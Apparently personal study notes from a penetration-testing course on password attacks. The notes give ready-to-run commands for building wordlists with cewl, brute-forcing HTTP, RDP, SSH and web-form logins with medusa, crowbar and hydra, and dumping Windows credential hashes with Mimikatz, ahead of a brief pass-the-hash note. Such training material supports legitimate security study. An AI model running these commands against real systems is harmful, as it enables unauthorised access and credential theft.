Wordlists
	cewl to create custom Wordlists
		cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
			-m = min length
			-w = wordlist (output) file
	hashcat/ john rules (hashcat is better but not covered in the course)

Brute force Wordlists
	very time consuming and barely ever used
	guessing every single combination of characters
	can employ rules to cut down on guess amounts
		like a hashcat mask attack
	maskprocesser is better than crunch

Common Network service attack methods
	many popular tools for bruteforcing
		hydra, medusa, crowbar, spray

	HTTP htaccess attack with medusa
		medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
		medusa -d
			show available protocols

	Remote Desktop attack with crowbar
		sudo apt install crowbar
		crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1

	SSH Attack with hydra
		hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

	HTTP POST with Hydra
		<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
		hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

Leveraging Password Hashes
	Linux
		/etc/shadow
	Windows
		Mimikatz or secrets dump
		user hashes are stored in the Security Accounts Manager (SAM)
		Mimikatz extraction from the Local Security Authority Subsystem (LSASS) process memory
		LSASS runs as SYSTEM need privilege::debug (enables SeDebugPrivilege)
		since LSASS runs as system, need a higher level than just running mimikatz as admin

		C:\Tools\password_attacks\mimikatz.exe
		privilege::debug
		token::elevate
		lsadump::sam

	Pasing the hash in Windows
		PTH allows you to remotely authenticate using a claid username and NTLM hash rather than a password
